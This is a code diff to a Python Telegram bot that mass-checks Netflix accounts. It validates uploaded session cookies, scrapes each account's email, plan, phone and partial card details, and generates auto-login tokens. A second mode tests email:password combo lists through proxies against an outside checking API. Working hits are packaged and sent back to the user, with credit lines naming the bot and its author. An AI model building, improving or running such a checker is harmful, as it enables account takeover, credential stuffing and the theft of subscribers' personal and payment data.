@@ -77,9 +77,9 @@ def validate_api_key(key):
     except:
         return False
 
-# ====================== YOUR EXACT COOKIE CHECKER (FAST THREADS) ======================
+# ====================== YOUR EXACT WORKING COOKIE CHECKER ======================
 class NetflixBulkChecker:
-    def __init__(self, threads=20):          # ← Changed to 20 for faster checking
+    def __init__(self, threads=20):
         self.threads = threads
         self.lock = threading.Lock()
         self.stats = {'total': 0, 'checked': 0, 'hits': 0, 'bad': 0, 'errors': 0, 'start_time': time.time()}
@@ -89,62 +89,84 @@ class NetflixBulkChecker:
     def parse_netscape_cookie(self, text):
         cookies = {}
         text = text.strip()
-        if not text: return cookies
+        if not text:
+            return cookies
+
         if ';' in text and '=' in text:
             for part in text.split(';'):
                 part = part.strip()
                 if '=' in part:
                     k, v = part.split('=', 1)
                     cookies[k.strip()] = v.strip()
-            if cookies: return cookies
+            if cookies:
+                return cookies
+
         for line in text.splitlines():
             line = line.strip()
-            if not line or line.startswith('#'): continue
+            if not line or line.startswith('#'):
+                continue
+
             if '\t' in line:
                 parts = line.split('\t')
                 if len(parts) >= 7:
                     cookies[parts[5]] = parts[6]
                     continue
+
             parts = re.split(r'\s+', line)
             if len(parts) >= 7:
                 cookies[parts[5]] = parts[6]
                 continue
+
             if '=' in line:
                 k, v = line.split('=', 1)
                 cookies[k.strip()] = v.strip()
+
         return cookies
 
     def check_cookie(self, cookie_text, source_name):
         try:
             cookies = self.parse_netscape_cookie(cookie_text)
-            if not cookies: return None
+            if not cookies:
+                return None
+
             session = requests.Session()
             for k, v in cookies.items():
                 session.cookies.set(k, v, domain='.netflix.com', path='/')
+
             r = session.get('https://www.netflix.com/account/membership', timeout=40, allow_redirects=True)
-            if 'login' in r.url.lower() or '"membershipStatus":"CURRENT_MEMBER"' not in r.text:
+            if 'login' in r.url.lower():
                 return None
+
             html = r.text
+            if '"membershipStatus":"CURRENT_MEMBER"' not in html:
+                return None
+
             result = {
-                'email': re.search(r'"emailAddress":"([^"]+)"', html).group(1) or 'N/A',
-                'plan': re.search(r'localizedPlanName.*?"value":"([^"]+)"', html).group(1) or 'Unknown',
-                'country_code': re.search(r'"countryOfSignup":"([^"]+)"', html).group(1) or 'XX',
-                'next_billing': re.search(r'"nextBillingDate".*?"value":"([^"]+)"', html).group(1) or 'N/A',
-                'phone': re.search(r'"phoneNumber":"([^"]+)"', html).group(1) or 'N/A',
-                'card_brand': re.search(r'"ccPaymentMethodBrandName":"([^"]+)"', html).group(1) or 'N/A',
-                'last4': re.search(r'"lastFourDigits":"([^"]+)"', html).group(1) or 'N/A',
+                'email': re.search(r'"emailAddress":"([^"]+)"', html).group(1) if re.search(r'"emailAddress":"([^"]+)"', html) else 'N/A',
+                'plan': re.search(r'localizedPlanName.*?"value":"([^"]+)"', html).group(1) if re.search(r'localizedPlanName.*?"value":"([^"]+)"', html) else 'Unknown',
+                'country_code': re.search(r'"countryOfSignup":"([^"]+)"', html).group(1) if re.search(r'"countryOfSignup":"([^"]+)"', html) else 'XX',
+                'next_billing': re.search(r'"nextBillingDate".*?"value":"([^"]+)"', html).group(1) if re.search(r'"nextBillingDate".*?"value":"([^"]+)"', html) else 'N/A',
+                'phone': re.search(r'"phoneNumber":"([^"]+)"', html).group(1) if re.search(r'"phoneNumber":"([^"]+)"', html) else 'N/A',
+                'card_brand': re.search(r'"ccPaymentMethodBrandName":"([^"]+)"', html).group(1) if re.search(r'"ccPaymentMethodBrandName":"([^"]+)"', html) else 'N/A',
+                'last4': re.search(r'"lastFourDigits":"([^"]+)"', html).group(1) if re.search(r'"lastFourDigits":"([^"]+)"', html) else 'N/A',
                 'profiles': len(re.findall(r'"profileName"', html)),
                 'source': source_name,
                 'cookie': cookie_text.strip()
             }
+
             try:
                 nftoken = self.generate_nftoken(cookies)
-                result['nftoken'] = nftoken or "N/A"
-                result['login_url'] = f"https://netflix.com/account?nftoken={nftoken}" if nftoken else "N/A"
+                if nftoken:
+                    result['login_url'] = f"https://netflix.com/account?nftoken={nftoken}"
+                    result['nftoken'] = nftoken
+                else:
+                    result['nftoken'] = "N/A"
             except:
                 result['nftoken'] = "N/A"
                 result['login_url'] = "N/A"
+
             return result
+
         except:
             return None
 
@@ -153,8 +175,10 @@ class NetflixBulkChecker:
             session = requests.Session()
             for name, value in cookies_dict.items():
                 session.cookies.set(name, value, domain='.netflix.com', path='/')
+            
             payload = {"operationName": "CreateAutoLoginToken", "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"}, "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}}
             headers = {'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)', 'Accept': 'application/json', 'Content-Type': 'application/json'}
+            
             response = session.post('https://android13.prod.ftl.netflix.com/graphql', headers=headers, json=payload, timeout=20)
             if response.status_code == 200:
                 data = response.json()
@@ -179,8 +203,10 @@ class NetflixBulkChecker:
             if result:
                 self.stats['hits'] += 1
                 self.premium_accounts.append(result)
+                
                 os.makedirs('hits', exist_ok=True)
                 fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
+                
                 with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
                     f.write(f"Email: {result['email']}\n")
                     f.write(f"Plan: {result['plan']}\n")
@@ -194,6 +220,8 @@ class NetflixBulkChecker:
                     f.write(f"NF Token: {result.get('nftoken', 'N/A')}\n\n")
                     f.write("checked by @Nf_premium_checker_bot\n")
                     f.write("Bot Made by @Sudhakaran12\n")
+                
+                print(f"{Fore.GREEN}[✓] HIT #{self.stats['hits']}: {result['email']} - {result['plan']}{Style.RESET_ALL}")
             else:
                 self.stats['bad'] += 1
 
@@ -205,7 +233,7 @@ class NetflixBulkChecker:
         self.stats['total'] = len(files)
         print(f"Starting check on {len(files)} files...")
 
-        with ThreadPoolExecutor(max_workers=self.threads) as exe:   # ← 20 threads
+        with ThreadPoolExecutor(max_workers=self.threads) as exe:
             for i, f in enumerate(files, 1):
                 exe.submit(self.process_cookie_file, f, i)
 
@@ -218,7 +246,8 @@ class ComboChecker:
             base_url = get_server_base_url()
             url = f"{base_url}/api/netflix/check"
             payload = {"email": email, "pass": password}
-            if proxy: payload["proxy"] = proxy
+            if proxy:
+                payload["proxy"] = proxy
             response = requests.post(url, json=payload, headers={
                 "X-API-Key": API_KEY,
                 "X-Platform": "netflix"
@@ -236,7 +265,7 @@ def start_cmd(message):
     markup.add("🍪 Cookie Mode (ZIP)")
     markup.add("🔑 Combo Mode (ZIP)")
     markup.add("/setkey")
-    bot.reply_to(message, "🚀 Netflix Checker Bot Ready!\nChoose mode:", reply_markup=markup)
+    bot.reply_to(message, "🚀 Netflix Checker Bot Ready!\nChoose mode below:", reply_markup=markup)
 
 @bot.message_handler(commands=['setkey'])
 def setkey_cmd(message):
@@ -271,6 +300,8 @@ def handle_zip(message):
 
         with tempfile.TemporaryDirectory() as tmp:
             zip_path = os.path.join(tmp, "input.zip")
+            
+            # === EXACT DOWNLOAD CODE FROM YOUR WORKING VERSION ===
             with requests.get(file_url, stream=True, timeout=(15, 360)) as response:
                 response.raise_for_status()
                 with open(zip_path, 'wb') as f:
@@ -284,7 +315,7 @@ def handle_zip(message):
             mode = user_mode.get(message.chat.id, "cookie")
 
             if mode == "cookie":
-                checker = NetflixBulkChecker(threads=20)          # ← Faster (20 threads)
+                checker = NetflixBulkChecker(threads=10)
                 checker.chat_id = str(message.chat.id)
                 checker.start(extract_dir)
             else:  # Combo Mode
@@ -302,7 +333,7 @@ def handle_zip(message):
                         else:
                             proxy_file = path
                 if not combo_file or not proxy_file:
-                    bot.reply_to(message, "❌ ZIP must contain one combo file and one proxy file")
+                    bot.reply_to(message, "❌ ZIP must contain one combo file (email:pass) and one proxy file")
                     return
 
                 checker = ComboChecker()
@@ -314,7 +345,7 @@ def handle_zip(message):
                             accounts.append({"email": email, "password": pw})
                 proxies = [line.strip() for line in open(proxy_file, 'r', encoding='utf-8', errors='ignore') if line.strip() and not line.startswith('#')]
 
-                with ThreadPoolExecutor(max_workers=20) as exe:     # ← Faster (20 threads)
+                with ThreadPoolExecutor(max_workers=10) as exe:
                     for acc in accounts:
                         proxy = random.choice(proxies) if proxies else None
                         result = checker.check_account(acc['email'], acc['password'], proxy)
@@ -330,6 +361,7 @@ def handle_zip(message):
                                 f.write("\nchecked by @Nf_premium_checker_bot\n")
                                 f.write("Bot Made by @Sudhakaran12\n")
 
+            # Send hits ZIP
             if os.path.exists("hits") and os.listdir("hits"):
                 hits_zip = os.path.join(tmp, "hits.zip")
                 with zipfile.ZipFile(hits_zip, 'w') as z:
@@ -348,6 +380,6 @@ def handle_zip(message):
     user_mode.pop(message.chat.id, None)
 
 if __name__ == "__main__":
-    print("🚀 Netflix Cookie + Combo Bot Started Successfully (FAST MODE)")
+    print("🚀 Netflix Cookie + Combo Bot Started Successfully")
     bot.remove_webhook()
     bot.infinity_polling(skip_pending=True)
